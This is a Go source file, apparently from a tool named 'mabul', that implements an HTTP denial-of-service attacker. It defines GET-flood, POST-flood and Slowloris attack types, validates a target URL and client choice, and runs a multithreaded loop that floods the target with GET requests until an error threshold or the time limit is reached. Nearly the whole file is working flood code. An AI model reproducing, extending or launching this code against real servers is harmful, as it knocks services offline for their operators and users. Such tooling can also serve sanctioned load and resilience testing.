package http

import (
	"context"
	"crypto/tls"
	"fmt"
	"net/http"
	"net/url"
	"strings"
	"sync"
	"time"

	"errors"

	"github.com/levigross/mabul/base"
	"github.com/valyala/fasthttp"
	"go.uber.org/zap"
)

// AttackType is our enum for attacks
type AttackType int

const (
	// GetFlood floods the server with GET requests
	GetFlood AttackType = iota
	// PostFlood Floods the server with POST requests
	PostFlood
	// Slowloris opens up connections and trickles bytes in
	Slowloris
)

// AttackConfig enables one to configure an attack
type AttackConfig struct {
	base.StatefulAttackerConfig
	HTTPClient string
	URL        string
	TLSConfig  *tls.Config

	// AttackType the type of attack you wish to execute
	AttackType AttackType

	// Send the Flood using the QUIC protocol
	Quic bool

	url        *url.URL
	fastClient *fasthttp.Client
	regClient  *http.Client
	context    context.Context
}

var _ base.Validator = &AttackConfig{}

// Validate allows us to validate the flags we got in
func (a *AttackConfig) Validate() (err error) {
	switch strings.ToLower(a.HTTPClient) {
	case "fasthttp", "net/http":
	default:
		return fmt.Errorf("%v is not a valid HTTP client", a.HTTPClient)
	}

	if strings.ToLower(a.HTTPClient) == "fasthttp" && a.Quic {
		return errors.New("quic is only supported using the native net/http client")
	}

	if a.url, err = url.Parse(a.URL); err != nil {
		return err
	}
	// TODO: Replace with SSL attacker
	a.TLSConfig = &tls.Config{ServerName: a.url.Hostname()}

	return nil
}

// Attacker holds the information on our HTTPS attack
type Attacker struct {
	Config *AttackConfig
	Target *base.Target
	Log    *zap.SugaredLogger

	GetAttacker GetFloodAttack
}

var _ base.Attacker = &Attacker{}

// Attack validates the attacker interface. The validator will
// mangle the values, making it easier to use them.
func (a *Attacker) Attack(v ...base.Validator) error {
	if err := base.Validate(v...); err != nil {
		return err
	}

	switch a.Config.AttackType {
	case GetFlood:
		switch strings.ToLower(a.Config.HTTPClient) {
		case "fasthttp":
			a.GetAttacker = &FastHTTPGet{}
		case "net/http":
			a.GetAttacker = &RegHTTPGet{}
		}
		a.GetAttacker.SetAttacker(a)
	}

	select {
	case <-time.After(a.Config.AttackDuration):
		return nil
	case err := <-a.attack():
		return err
	}
}

func (a *Attacker) attack() <-chan error {
	errChan := make(chan error, 1)
	go func() {
		errChan <- a.derAttacker()
	}()
	return errChan
}

func (a *Attacker) derAttacker() error {
	fatalError := make(chan error, 1)
	for i := uint(0); i <= a.Config.NumThreads; i++ {
		switch a.Config.AttackType {
		case GetFlood:
			go a.GetFlood(fatalError)
		}
	}
	return <-fatalError
}

// GetFlood executes a Get request flood
func (a Attacker) GetFlood(c chan error) {
	var wg sync.WaitGroup
	connectionErrors := map[string]uint64{}
	var errorsTex sync.Mutex
	// Canary connection
	if err := a.GetAttacker.Get(); err != nil {
		c <- fmt.Errorf("Unable to make canary connection %v", err)
	}
	for {
		for i := uint(0); i < a.Config.NumConnections; i++ {
			wg.Add(1)
			go func() {
				if err := a.GetAttacker.Get(); err != nil {
					errorsTex.Lock()
					a.Log.Debug("http: Got Request Error: ", err)
					connectionErrors[err.Error()]++
					errorsTex.Unlock()
				}
				wg.Done()
			}()
		}
		wg.Wait()
		if ok, precent := errorsToHigh(mapSum(connectionErrors),
			a.Config.NumConnections, a.Config.ErrorThreshold); ok {
			c <- fmt.Errorf("Error precentage too high. allowed: %v got %v",
				a.Config.ErrorThreshold, precent)
		}
		connectionErrors = map[string]uint64{}
	}
}
